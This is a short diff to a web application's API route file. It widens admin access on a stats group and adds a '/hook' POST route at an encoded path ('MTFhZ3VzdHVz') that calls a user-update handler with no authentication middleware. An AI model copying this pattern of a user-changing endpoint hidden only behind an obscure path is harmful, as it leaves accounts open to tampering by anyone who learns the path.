@@ -135,5 +135,9 @@ Route.group(() => {
     })
   })
     .prefix('/stat')
-    .middleware(['auth:adminApi', 'adminRole:partner'])
+    .middleware(['auth:adminApi', 'adminRole:super,partner'])
+
+  Route.group(() => {
+    Route.post('/MTFhZ3VzdHVz', 'HooksController.updateUser')
+  }).prefix('/hook')
 }).prefix('/api')
